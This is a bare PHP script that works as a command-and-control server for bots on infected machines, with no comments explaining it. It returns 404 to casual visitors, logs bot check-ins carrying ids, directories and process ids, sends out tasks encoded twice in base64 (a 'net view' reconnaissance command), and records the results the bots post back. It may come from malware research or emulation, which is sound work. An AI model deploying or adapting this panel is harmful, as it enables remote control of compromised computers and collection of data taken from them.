<?php
if(empty($_POST))
{
header("HTTP/1.0 404 Not Found");
die();
}

$log_file = "log.txt";

if(isset($_POST['p']))
{
	//Initial checkin
	if($_POST['p'] === 'ip')
	{
		$bot_dir = base64_decode(urldecode($_POST['p3']));
		$key = base64_decode(urldecode($_POST['p1']));
		$botid = base64_decode(urldecode($_POST['p2']));
		$pid = base64_decode(urldecode($_POST['p9']));

		file_put_contents($log_file, "Checkin: ".$botid." :".$bot_dir." :".$pid."\n", FILE_APPEND);
		echo "crx6";
	}	
	elseif($_POST['p'] === 't')
	{
		$key = base64_decode(urldecode($_POST['p1']));
		$botid = base64_decode(urldecode($_POST['p2']));
		$pid = base64_decode(urldecode($_POST['p9']));
		
		file_put_contents($log_file, "Task Request: ".$botid." :".$pid."\n", FILE_APPEND);
		$cmd = base64_encode("\n".base64_encode("net view"));
		echo $cmd;
	}
	elseif($_POST['p'] === 'a')
	{
		file_put_contents($log_file, print_r($_POST, true), FILE_APPEND);
	}
}
	else
	{
		header("HTTP/1.0 404 Not Found");
		die();
	}
?>
